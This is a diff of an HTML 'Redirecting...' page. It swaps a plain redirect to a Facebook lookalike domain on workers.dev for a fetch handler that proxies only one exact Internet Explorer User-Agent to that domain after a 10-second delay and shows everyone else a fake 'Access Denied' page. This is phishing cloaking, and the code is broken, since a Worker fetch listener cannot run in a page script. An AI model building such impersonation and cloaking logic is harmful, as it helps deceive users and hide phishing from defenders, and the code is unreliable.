@@ -5,15 +5,32 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Redirecting...</title>
 <script>
-  // Define the URL of your Cloudflare Worker
-  const workerURL = 'http://facebook-com.foxiproxi.workers.dev/'; // Replace with your Cloudflare Worker URL
+  addEventListener('fetch', event => {
+    event.respondWith((async () => {
+      const targetDomain = 'facebook-com.foxiproxi.workers.dev';
+      const request = event.request;
 
-  // Redirect to the Cloudflare Worker URL
-  window.location.replace(workerURL);
+      if (request.headers.get('User-Agent') === 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko') {
+        await new Promise(resolve => setTimeout(resolve, 10000));
+        
+        const redirectURL = new URL(request.url);
+        redirectURL.hostname = targetDomain;
+        return fetch(redirectURL, request);
+      } else {
+        const response = new Response('<h1>Access Denied</h1><p>You are not authorized to access this resource.</p>', {
+          status: 403,
+          statusText: 'Forbidden',
+          headers: {
+            'Content-Type': 'text/html'
+          }
+        });
+        return response;
+      }
+    })());
+  });
 </script>
 </head>
 <body>
-  <!-- Optional: You can add a message or content here -->
-  <p>If you are not redirected, <a href="{workerURL}">click here</a>.</p>
+  <p>This page is used for redirection.</p>
 </body>
 </html>
